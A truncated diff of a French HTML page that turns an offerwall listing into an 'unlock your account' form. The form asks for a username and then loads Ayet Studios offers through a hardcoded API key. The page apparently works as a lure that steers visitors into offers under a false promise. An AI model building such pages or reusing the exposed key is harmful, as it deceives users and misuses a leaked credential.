@@ -59,21 +59,24 @@
     </style>
   </head>
   <body>
- 
-<html>
-  <head>
-    <title>Offres Ayet Studios</title>
-  </head>
-  <body>
-    <h1>Offres Ayet Studios</h1>
+    <div class="container">
+      <h1>Débloquer le compte</h1>
+      <label>Entrez votre nom d'utilisateur :</label>
+      <input type="text" id="username">
+      <button onclick="unlockAccount()">Débloquer le compte</button>
+      <div class="loader" id="loader"></div>
+    </div>
+
     <ul id="offers"></ul>
+
     <script>
       // Remplacez "VOTRE_API_KEY" par votre propre clé API Ayet Studios
       var api_key = "6aa12b1c383c9214147518b169252a60";
       var offers_url = "https://api.ayetstudios.com/api/offers";
       var offers_div = document.getElementById("offers");
+      var loader_div = document.getElementById("loader");
 
-      // Fonction pour récupérer les offres depuis l'API et les afficher sur la page
+      // Fonction pour récupérer les offres depuis l'API Ayet Studios et les afficher sur la page
       function displayOffers() {
         // Effectuez une requête GET à l'API pour récupérer les offres
         fetch(`${offers_url}?apikey=${api_key}`)
@@ -89,8 +92,6 @@
           .catch(error => console.log(error));
       }
 
-      // Appellez la fonction pour afficher les offres sur la page
-      displayOffers();
-    </script>
-  </body>
-</html>
+      // Fonction appelée lorsqu'un utilisateur clique sur le bouton "Débloquer le compte"
+      function unlockAccount() {
+        // Masquez le formulaire et aff
